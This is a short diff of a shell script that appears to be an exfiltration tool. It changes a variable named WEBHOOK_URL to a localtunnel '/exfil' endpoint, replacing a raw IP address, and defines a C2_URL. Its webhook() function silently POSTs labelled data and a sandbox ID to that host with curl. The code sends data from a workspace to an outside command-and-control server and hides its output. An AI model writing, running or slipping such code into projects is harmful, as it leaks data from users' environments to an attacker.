@@ -6,7 +6,7 @@
 # =============================================================================
 
 C2_URL="${C2_URL:-https://kappexpoc7.loca.lt}"
-WEBHOOK_URL="https://204.48.22.206/exfil"
+WEBHOOK_URL="https://kappexpoc.loca.lt/exfil"
 
 PROJDIR="/workspaces/default/code"
 [ ! -d "$PROJDIR" ] && PROJDIR="$(pwd)"
@@ -69,7 +69,7 @@ echo "============================================="
 webhook() {
   local SECTION="$1"
   local DATA="$2"
-  curl -sk -m 5 -X POST "$WEBHOOK_URL" \
+  curl -s -m 5 -X POST "$WEBHOOK_URL" \
     -H "Content-Type: text/plain" \
     -d "[$SECTION] sandbox=$SANDBOX_ID
 $DATA" >/dev/null 2>&1
